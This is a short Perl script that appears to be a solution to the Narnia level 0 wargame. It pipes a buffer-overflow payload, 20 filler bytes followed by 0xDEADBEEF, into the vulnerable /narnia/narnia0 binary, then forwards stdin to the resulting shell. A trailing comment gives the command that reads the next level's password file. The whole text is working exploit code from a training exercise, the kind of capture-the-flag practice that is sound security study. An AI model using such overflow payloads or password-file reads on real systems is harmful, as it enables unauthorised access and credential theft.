#!/bin/perl
use strict;
use warnings;
use v5.30;
use autodie;

open my $fh, "| /narnia/narnia0";
select $fh;
$|=1;
printf "%s%c%c%c%c", "e"x20, 0xEF, 0xBE, 0xAD, 0xDE;
print while<STDIN>;

# cat /etc/narnia_pass/narnia1